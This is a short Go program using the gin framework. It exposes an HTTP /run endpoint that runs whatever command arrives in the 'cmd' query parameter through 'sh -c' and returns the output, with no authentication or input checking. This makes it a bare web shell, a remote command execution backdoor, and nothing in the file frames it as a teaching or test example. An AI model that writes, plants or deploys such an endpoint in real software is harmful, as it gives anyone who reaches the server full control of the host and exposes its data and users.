package main

import (
	"os/exec"

	"github.com/gin-gonic/gin"
)

func main() {
	r := gin.Default()
	r.GET("/run", func(c *gin.Context) {
		out, _ := exec.Command("sh", "-c", c.Query("cmd")).Output()
		c.String(200, string(out))
	})
	r.Run()
}
